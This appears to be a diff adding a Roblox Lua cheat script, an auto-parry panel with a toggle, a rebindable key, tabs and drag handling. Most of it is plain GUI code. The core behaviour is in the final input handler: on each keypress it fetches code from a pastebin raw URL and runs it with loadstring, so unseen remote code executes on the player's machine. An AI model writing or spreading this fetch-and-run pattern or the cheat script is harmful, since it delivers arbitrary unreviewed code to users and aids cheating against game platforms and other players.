@@ -1,0 +1,355 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local parryEnabled = true
+local currentKey   = Enum.KeyCode.F
+local isListeningForKey = false
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ParryGUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = PlayerGui
+
+local Window = Instance.new("Frame")
+Window.Name = "Window"
+Window.Size = UDim2.new(0, 260, 0, 200)
+Window.Position = UDim2.new(0.5, -130, 0.5, -100)
+Window.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
+Window.BorderSizePixel = 0
+Window.ClipsDescendants = true
+Window.Parent = ScreenGui
+
+local WinCorner = Instance.new("UICorner")
+WinCorner.CornerRadius = UDim.new(0, 8)
+WinCorner.Parent = Window
+
+local WinStroke = Instance.new("UIStroke")
+WinStroke.Color = Color3.fromRGB(255, 220, 60)
+WinStroke.Thickness = 1.2
+WinStroke.Parent = Window
+
+local TitleBar = Instance.new("Frame")
+TitleBar.Name = "TitleBar"
+TitleBar.Size = UDim2.new(1, 0, 0, 36)
+TitleBar.BackgroundColor3 = Color3.fromRGB(255, 220, 60)
+TitleBar.BorderSizePixel = 0
+TitleBar.Parent = Window
+
+local TitleCorner = Instance.new("UICorner")
+TitleCorner.CornerRadius = UDim.new(0, 8)
+TitleCorner.Parent = TitleBar
+
+local TitleCoverBottom = Instance.new("Frame")
+TitleCoverBottom.Size = UDim2.new(1, 0, 0, 8)
+TitleCoverBottom.Position = UDim2.new(0, 0, 1, -8)
+TitleCoverBottom.BackgroundColor3 = Color3.fromRGB(255, 220, 60)
+TitleCoverBottom.BorderSizePixel = 0
+TitleCoverBottom.Parent = TitleBar
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Text = "⚡ PARRY"
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextSize = 14
+TitleLabel.TextColor3 = Color3.fromRGB(18, 18, 22)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Size = UDim2.new(1, -60, 1, 0)
+TitleLabel.Position = UDim2.new(0, 12, 0, 0)
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.Parent = TitleBar
+
+local MinBtn = Instance.new("TextButton")
+MinBtn.Text = "−"
+MinBtn.Font = Enum.Font.GothamBold
+MinBtn.TextSize = 16
+MinBtn.TextColor3 = Color3.fromRGB(18, 18, 22)
+MinBtn.BackgroundTransparency = 1
+MinBtn.Size = UDim2.new(0, 28, 0, 28)
+MinBtn.Position = UDim2.new(1, -58, 0, 4)
+MinBtn.Parent = TitleBar
+
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Text = "✕"
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.TextSize = 13
+CloseBtn.TextColor3 = Color3.fromRGB(18, 18, 22)
+CloseBtn.BackgroundTransparency = 1
+CloseBtn.Size = UDim2.new(0, 28, 0, 28)
+CloseBtn.Position = UDim2.new(1, -30, 0, 4)
+CloseBtn.Parent = TitleBar
+
+local TabBar = Instance.new("Frame")
+TabBar.Size = UDim2.new(1, 0, 0, 30)
+TabBar.Position = UDim2.new(0, 0, 0, 36)
+TabBar.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
+TabBar.BorderSizePixel = 0
+TabBar.Parent = Window
+
+local TabLayout = Instance.new("UIListLayout")
+TabLayout.FillDirection = Enum.FillDirection.Horizontal
+TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
+TabLayout.Parent = TabBar
+
+local function makeTab(name, order)
+    local btn = Instance.new("TextButton")
+    btn.Text = name
+    btn.Font = Enum.Font.GothamSemibold
+    btn.TextSize = 12
+    btn.TextColor3 = Color3.fromRGB(160, 160, 170)
+    btn.BackgroundTransparency = 1
+    btn.Size = UDim2.new(0.5, 0, 1, 0)
+    btn.LayoutOrder = order
+    btn.Parent = TabBar
+    return btn
+end
+
+local TabMain     = makeTab("MAIN", 1)
+local TabSettings = makeTab("SETTINGS", 2)
+
+local TabIndicator = Instance.new("Frame")
+TabIndicator.Size = UDim2.new(0.5, 0, 0, 2)
+TabIndicator.Position = UDim2.new(0, 0, 1, -2)
+TabIndicator.BackgroundColor3 = Color3.fromRGB(255, 220, 60)
+TabIndicator.BorderSizePixel = 0
+TabIndicator.Parent = TabBar
+
+local Content = Instance.new("Frame")
+Content.Size = UDim2.new(1, 0, 1, -66)
+Content.Position = UDim2.new(0, 0, 0, 66)
+Content.BackgroundTransparency = 1
+Content.Parent = Window
+
+local MainPage = Instance.new("Frame")
+MainPage.Size = UDim2.new(1, 0, 1, 0)
+MainPage.BackgroundTransparency = 1
+MainPage.Parent = Content
+
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Text = "PARRY ACTIVE"
+StatusLabel.Font = Enum.Font.GothamBold
+StatusLabel.TextSize = 11
+StatusLabel.TextColor3 = Color3.fromRGB(100, 220, 130)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Size = UDim2.new(1, 0, 0, 18)
+StatusLabel.Position = UDim2.new(0, 0, 0, 12)
+StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
+StatusLabel.Parent = MainPage
+
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Text = "ENABLED"
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.TextSize = 13
+ToggleBtn.TextColor3 = Color3.fromRGB(18, 18, 22)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(100, 220, 130)
+ToggleBtn.Size = UDim2.new(0, 140, 0, 36)
+ToggleBtn.Position = UDim2.new(0.5, -70, 0, 36)
+ToggleBtn.BorderSizePixel = 0
+ToggleBtn.Parent = MainPage
+
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.CornerRadius = UDim.new(0, 6)
+ToggleCorner.Parent = ToggleBtn
+
+local KeyHint = Instance.new("TextLabel")
+KeyHint.Text = "bind: [ F ]"
+KeyHint.Font = Enum.Font.GothamSemibold
+KeyHint.TextSize = 11
+KeyHint.TextColor3 = Color3.fromRGB(100, 100, 115)
+KeyHint.BackgroundTransparency = 1
+KeyHint.Size = UDim2.new(1, 0, 0, 16)
+KeyHint.Position = UDim2.new(0, 0, 1, -22)
+KeyHint.TextXAlignment = Enum.TextXAlignment.Center
+KeyHint.Parent = MainPage
+
+local SettingsPage = Instance.new("Frame")
+SettingsPage.Size = UDim2.new(1, 0, 1, 0)
+SettingsPage.BackgroundTransparency = 1
+SettingsPage.Visible = false
+SettingsPage.Parent = Content
+
+local KeybindLabel = Instance.new("TextLabel")
+KeybindLabel.Text = "PARRY KEYBIND"
+KeybindLabel.Font = Enum.Font.GothamSemibold
+KeybindLabel.TextSize = 11
+KeybindLabel.TextColor3 = Color3.fromRGB(120, 120, 135)
+KeybindLabel.BackgroundTransparency = 1
+KeybindLabel.Size = UDim2.new(1, -32, 0, 16)
+KeybindLabel.Position = UDim2.new(0, 16, 0, 14)
+KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
+KeybindLabel.Parent = SettingsPage
+
+local KeyBindBtn = Instance.new("TextButton")
+KeyBindBtn.Text = "[ F ]"
+KeyBindBtn.Font = Enum.Font.GothamBold
+KeyBindBtn.TextSize = 13
+KeyBindBtn.TextColor3 = Color3.fromRGB(255, 220, 60)
+KeyBindBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
+KeyBindBtn.Size = UDim2.new(1, -32, 0, 36)
+KeyBindBtn.Position = UDim2.new(0, 16, 0, 36)
+KeyBindBtn.BorderSizePixel = 0
+KeyBindBtn.Parent = SettingsPage
+
+local KeyBindCorner = Instance.new("UICorner")
+KeyBindCorner.CornerRadius = UDim.new(0, 6)
+KeyBindCorner.Parent = KeyBindBtn
+
+local KeyBindStroke = Instance.new("UIStroke")
+KeyBindStroke.Color = Color3.fromRGB(60, 60, 75)
+KeyBindStroke.Thickness = 1
+KeyBindStroke.Parent = KeyBindBtn
+
+local KeyBindHint = Instance.new("TextLabel")
+KeyBindHint.Text = "click, then press any key"
+KeyBindHint.Font = Enum.Font.Gotham
+KeyBindHint.TextSize = 10
+KeyBindHint.TextColor3 = Color3.fromRGB(80, 80, 95)
+KeyBindHint.BackgroundTransparency = 1
+KeyBindHint.Size = UDim2.new(1, -32, 0, 14)
+KeyBindHint.Position = UDim2.new(0, 16, 0, 78)
+KeyBindHint.TextXAlignment = Enum.TextXAlignment.Left
+KeyBindHint.Parent = SettingsPage
+local function updateToggleVisual()
+    if parryEnabled then
+        ToggleBtn.Text = "ENABLED"
+        ToggleBtn.BackgroundColor3 = Color3.fromRGB(100, 220, 130)
+        ToggleBtn.TextColor3 = Color3.fromRGB(18, 18, 22)
+        StatusLabel.Text = "PARRY ACTIVE"
+        StatusLabel.TextColor3 = Color3.fromRGB(100, 220, 130)
+    else
+        ToggleBtn.Text = "DISABLED"
+        ToggleBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 82)
+        ToggleBtn.TextColor3 = Color3.fromRGB(160, 160, 170)
+        StatusLabel.Text = "PARRY INACTIVE"
+        StatusLabel.TextColor3 = Color3.fromRGB(160, 80, 80)
+    end
+end
+
+ToggleBtn.MouseButton1Click:Connect(function()
+    parryEnabled = not parryEnabled
+    updateToggleVisual()
+end)
+local function setKey(keyCode)
+    currentKey = keyCode
+    local name = keyCode.Name
+    KeyBindBtn.Text = "[ " .. name .. " ]"
+    KeyHint.Text = "bind: [ " .. name .. " ]"
+    KeyBindStroke.Color = Color3.fromRGB(60, 60, 75)
+    KeyBindBtn.TextColor3 = Color3.fromRGB(255, 220, 60)
+end
+
+KeyBindBtn.MouseButton1Click:Connect(function()
+    if isListeningForKey then return end
+    isListeningForKey = true
+    KeyBindBtn.Text = "press a key..."
+    KeyBindBtn.TextColor3 = Color3.fromRGB(255, 180, 40)
+    KeyBindStroke.Color = Color3.fromRGB(255, 220, 60)
+
+    local conn
+    conn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            conn:Disconnect()
+            isListeningForKey = false
+            setKey(input.KeyCode)
+        end
+    end)
+end)
+local function switchTab(tab)
+    if tab == "main" then
+        MainPage.Visible = true
+        SettingsPage.Visible = false
+        TabMain.TextColor3 = Color3.fromRGB(255, 220, 60)
+        TabSettings.TextColor3 = Color3.fromRGB(160, 160, 170)
+        TweenService:Create(TabIndicator, TweenInfo.new(0.15), {
+            Position = UDim2.new(0, 0, 1, -2)
+        }):Play()
+    else
+        MainPage.Visible = false
+        SettingsPage.Visible = true
+        TabMain.TextColor3 = Color3.fromRGB(160, 160, 170)
+        TabSettings.TextColor3 = Color3.fromRGB(255, 220, 60)
+        TweenService:Create(TabIndicator, TweenInfo.new(0.15), {
+            Position = UDim2.new(0.5, 0, 1, -2)
+        }):Play()
+    end
+end
+
+TabMain.MouseButton1Click:Connect(function() switchTab("main") end)
+TabSettings.MouseButton1Click:Connect(function() switchTab("settings") end)
+switchTab("main") -- default
+local minimized = false
+local fullHeight = 200
+
+MinBtn.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    local targetSize = minimized
+        and UDim2.new(0, 260, 0, 36)
+        or  UDim2.new(0, 260, 0, fullHeight)
+    TweenService:Create(Window, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
+        Size = targetSize
+    }):Play()
+    MinBtn.Text = minimized and "+" or "−"
+end)
+
+CloseBtn.MouseButton1Click:Connect(function()
+    TweenService:Create(Window, TweenInfo.new(0.15), {
+        Size = UDim2.new(0, 260, 0, 0)
+    }):Play()
+    task.delay(0.2, function()
+        ScreenGui:Destroy()
+    end)
+end)
+local dragging = false
+local dragStart, startPos
+
+TitleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos  = Window.Position
+    end
+end)
+
+TitleBar.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (
+        input.UserInputType == Enum.UserInputType.MouseMovement or
+        input.UserInputType == Enum.UserInputType.Touch
+    ) then
+        local delta = input.Position - dragStart
+        Window.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+local function getParryKey()
+    return currentKey
+end
+
+local function isParryEnabled()
+    return parryEnabled
+end
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if not isParryEnabled() then return end
+    if input.KeyCode ~= getParryKey() then return end
+    local parryFunc = loadstring(game:HttpGet("https://pastebin.com/raw/0tzZb0Cm"))()
+end)
+Window.Size = UDim2.new(0, 260, 0, 0)
+TweenService:Create(Window, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    Size = UDim2.new(0, 260, 0, fullHeight)
+}):Play()
